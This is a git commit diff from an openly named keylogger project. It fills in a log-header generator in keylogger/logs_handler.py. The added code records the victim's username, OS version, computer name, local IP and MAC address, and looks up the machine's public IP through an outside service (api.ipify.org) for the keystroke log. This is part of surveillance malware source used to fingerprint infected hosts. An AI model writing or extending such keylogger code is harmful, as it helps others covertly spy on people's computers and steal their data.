47cbbf3c4706959b375539d957da74523810800f
Kammelleon <kamtech.octopus@gmail.com>
2022-11-01 07:32:22 +0100

    Created header generator

--- keylogger/logs_handler.py
+++ keylogger/logs_handler.py
@@ -1,27 +1,47 @@
 """
 Tutorial context managers: https://www.geeksforgeeks.org/context-manager-in-python/
 """
-
+import datetime
+import platform
+from requests import get
 from .interfaces import LogsBase
-
+import getpass
+import socket
+import re
+import uuid
+import os
 
 class LogsHandler(LogsBase):
     def __init__(self):
         self.logs_file = ""
-        self._open_mode = "a+"
+        self.open_mode = "a+"
 
     def __enter__(self):
-        self.file = open(self.logs_file, self._open_mode)
+        self.file = open(self.logs_file, self.open_mode)
         return self.file
 
     def __exit__(self):
         self.file.close()
 
     def add_header(self):
-        pass
+        with open(self.logs_file, self.open_mode) as log_file:
+            log_file.write(self._create_header())
 
     def _add_datetime(self):
         pass
 
     def _create_header(self):
-        pass
+        current_date = self._get_current_date()
+        header = f"-------------System-Information-------------\n" \
+                 f"Date: {current_date}\n" \
+                 f"User: {getpass.getuser()}\n" \
+                 f"System: {platform.system()} {platform.version()}\n" \
+                 f"Computer name: {platform.node()}\n" \
+                 f"Local IP: {socket.gethostbyname(socket.gethostname())}\n" \
+                 f"MAC address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}\n" \
+                 f"Public IP {get('https://api.ipify.org').text}\n" \
+                 f"--------------------------------------------\n"
+        return header
+
+    def _get_current_date(self):
+        return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
